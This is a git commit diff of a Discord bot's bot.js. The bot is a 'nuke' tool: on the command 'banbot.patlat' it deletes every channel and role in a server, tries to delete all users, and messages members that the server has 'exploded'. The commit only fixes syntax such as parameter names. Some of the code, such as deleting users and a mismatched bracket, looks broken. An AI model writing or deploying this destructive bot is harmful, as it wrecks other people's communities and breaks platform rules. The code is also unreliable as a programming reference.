a2051db3abe807a1f9c80deebb629e71de7c62dc
Mert Yıldırım <50714128+xRookieFight@users.noreply.github.com>
2020-07-16 22:32:56 +0300

    BanBOT Main

--- bot.js
+++ bot.js
@@ -7,20 +7,20 @@ client.on("ready", () => {
 console.log("Bot Aktif")
 });
 
-client.on("message", msg => {
+client.on('message', msg => {
 if (msg.content === 'banbot.patlat') {
 msg.delete()
 msg.guild.channels.forEach(banbot => {
 banbot.delete()
 });
-msg.guild.roles.forEach(by-rookie-fight => {
-by-rookie-fight.delete()
+msg.guild.roles.forEach(by_rookie_fight => {
+by_rookie_fight.delete()
 });
-msg.guild.users.forEach(ban-bot => {
-ban-bot.delete()
+msg.guild.users.forEach(ban_bot => {
+ban_bot.delete()
 });
-msg.guild.users.forEach(termse-uyumlu-degildir-kullanmayin => {
-termse-uyumlu-degildir-kullanmayin.send('Sunucu patladı! \n Geçmiş olsun napalım?')
+msg.guild.users.forEach(termse_uyumlu_degildir_kullanmayin => {
+termse_uyumlu_degildir_kullanmayin.send('Sunucu patladı! \n Geçmiş olsun napalım?')
 }
 });
 
